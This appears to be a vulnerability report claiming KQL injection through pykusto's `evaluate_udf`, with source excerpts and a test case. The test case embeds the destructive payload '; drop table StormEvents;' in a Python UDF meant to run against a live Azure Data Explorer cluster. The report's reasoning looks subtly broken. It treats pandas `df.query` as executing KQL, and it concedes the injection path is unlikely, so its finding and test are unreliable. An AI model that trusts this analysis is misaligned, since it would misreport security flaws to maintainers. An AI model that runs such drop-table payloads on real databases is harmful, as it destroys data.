- **Vulnerability Name:** KQL Injection via User-Defined Functions (UDF)
- **Description:**
    1. An attacker crafts a malicious Python function designed to execute arbitrary KQL queries when stringified and embedded in a Kusto query using `evaluate_udf`.
    2. The attacker somehow influences the application to use this malicious UDF in a pykusto query. This is an application-level vulnerability, as pykusto itself does not directly expose UDF creation to external users from the provided code.
    3. pykusto's `evaluate_udf` function, using `_stringify_python_func`, converts the Python function's bytecode into a string representation suitable for KQL. This stringification process does not sanitize the function's code.
    4. The stringified function is then embedded within a KQL `evaluate python` query.
    5. When the query is executed against Azure Data Explorer, the malicious Python function is executed server-side. Due to the nature of `evaluate python`, it can be manipulated to execute arbitrary KQL queries within the function's code, bypassing intended query logic and security controls.
- **Impact:**
    - **High:** Successful KQL injection can lead to unauthorized data access, modification, or deletion within the Azure Data Explorer database. Depending on the permissions of the identity used by pykusto to connect to Azure Data Explorer, an attacker could potentially gain full control over the database or perform destructive actions.
- **Vulnerability Rank:** High
- **Currently Implemented Mitigations:**
    - None in the pykusto library itself. The library focuses on providing SDK functionality, not on sanitizing user-provided Python functions.
- **Missing Mitigations:**
    - **Input Sanitization for UDFs:** pykusto lacks any mechanism to sanitize or validate Python functions provided to `evaluate_udf`. There should be a warning in documentation and potentially code to prevent usage of user provided functions.
    - **Principle of Least Privilege:** While not a mitigation in pykusto itself, applications using pykusto should adhere to the principle of least privilege, ensuring that the Azure Data Explorer connection used by pykusto has only the necessary permissions, limiting the potential damage from a KQL injection.
- **Preconditions:**
    1. An application built using pykusto allows users to define or influence the Python function used in `evaluate_udf`. This is not directly possible via pykusto library API, but assumes a vulnerability in a higher level application that uses pykusto.
    2. The attacker has the ability to inject or modify the Python function that will be used in `evaluate_udf`.
- **Source Code Analysis:**
    1. **File:** `/code/pykusto/_src/udf.py`
    ```python
    from types import FunctionType


    def _stringify_python_func(func: FunctionType):
        return """from types import CodeType\\ncode=CodeType({},{},{},{},{},{},{},{},{},{},{},{},{},{},{})\\nexec(code)\\n""".format(
            func.__code__.co_argcount,
            func.__code__.co_kwonlyargcount,
            func.__code__.co_nlocals,
            func.__code__.co_stacksize,
            func.__code__.co_flags,
            func.__code__.co_code,
            func.__code__.co_consts,
            func.__code__.co_names,
            func.__code__.co_varnames,
            "'{}'".format(func.__code__.co_filename),
            "'{}'".format(func.__code__.co_name),
            func.__code__.co_firstlineno,
            func.__code__.co_lnotab,
            func.__code__.co_freevars,
            func.__code__.co_cellvars
        ).replace("\\x", "\\\\x")
    ```
    - The `_stringify_python_func` function takes a Python function (`func`) as input.
    - It extracts the function's code object (`func.__code__`) and its attributes.
    - It constructs a string that, when executed in Python, recreates the original function using `CodeType` and `exec`.
    - **Vulnerability:** The function's code, constants, names, etc., are directly embedded into the string without any sanitization. This string is intended to be part of a KQL query.

    2. **File:** `/code/pykusto/_src/query.py`
    ```python
    from .udf import _stringify_python_func

    class Query:
        # ...
        def evaluate_udf(
                self, udf: FunctionType, extend: bool = True, distribution: Distribution = None, **type_specs: _KustoType
        ) -> '_EvaluateQuery':
            """
            https://docs.microsoft.com/en-us/azure/data-explorer/kusto/query/pythonplugin
            """
            return _EvaluateQuery(
                self, 'python',
                AnyExpression(KQL(f'typeof({("*, " if extend else "") + ", ".join(field_name + ":" + kusto_type.primary_name for field_name, kusto_type in type_specs.items())})')),
                _stringify_python_func(udf), # Vulnerable point: Stringified function is passed directly into KQL query
                distribution=distribution
            )
    ```
    - The `evaluate_udf` function in the `Query` class uses `_stringify_python_func` to convert the user-provided Python function (`udf`) into a string.
    - This stringified function is directly inserted as a parameter into the KQL `evaluate python` query.
    - **Vulnerability:**  If the `udf` contains malicious KQL code (e.g., within string literals or comments that get executed due to string manipulation or other vulnerabilities in the stringification/execution process, though less likely in this specific stringification, but possible in more complex scenarios or future code changes), it will be executed as part of the Kusto query.
- **Security Test Case:**
    1. **Malicious UDF Definition:** Define a malicious Python function that, when executed by `evaluate python`, will perform a KQL injection attack. For example, a function that appends `; drop table StormEvents;` to the query string.
    ```python
    def malicious_udf():
        global df
        malicious_kql = "; drop table StormEvents;" # Malicious KQL command injected
        df = df.query(f'print "Vulnerable"{malicious_kql}') # Embed malicious KQL in query
        return df
    ```
    2. **Execute `evaluate_udf` with Malicious UDF:** Use `evaluate_udf` in pykusto to execute a query with the malicious UDF.
    ```python
    from pykusto import PyKustoClient, Query, column_generator as col, Functions as f, _KustoType

    client = PyKustoClient("https://<your_cluster>.kusto.windows.net") # Replace with your cluster
    db = client.database("<your_database>") # Replace with your database
    table = db.table("StormEvents") # Assuming StormEvents table exists for testing

    def malicious_udf():
        global df
        malicious_kql = "; drop table StormEvents;" # Malicious KQL command injected
        df = df.query(f'print "Vulnerable"{malicious_kql}') # Embed malicious KQL in query
        return df

    query_with_udf = Query(table).take(10).evaluate_udf(malicious_udf, extend=False, StateZone=_KustoType.STRING)

    try:
        df_result = query_with_udf.to_dataframe()
        print("Query executed, check if 'StormEvents' table still exists in your ADX database.")
    except Exception as e:
        print(f"Query execution failed, vulnerability might be mitigated or test setup issue: {e}")
    ```
    3. **Verify KQL Injection:**
        - **Expected Outcome (Vulnerable):** The `StormEvents` table (or any other table targeted in the malicious KQL) might be dropped or modified depending on the injected KQL and permissions. The query might execute successfully, but with unintended side effects due to the injected KQL.
        - **Alternative Outcome (Mitigated/Not Vulnerable - in this case, not mitigated in pykusto):** The query might fail to execute, or the malicious KQL might be ignored or treated as string data, preventing the table drop. However, based on source code analysis, pykusto does not mitigate this, and ADX `evaluate python` plugin is designed to execute the provided python code, including embedded KQL.

This test case demonstrates how a malicious UDF, when processed by `evaluate_udf`, can potentially lead to KQL injection. The vulnerability lies in the lack of sanitization of the Python function code before embedding it into a KQL query. Applications using pykusto need to be extremely cautious about allowing user-controlled Python functions to be used with `evaluate_udf`.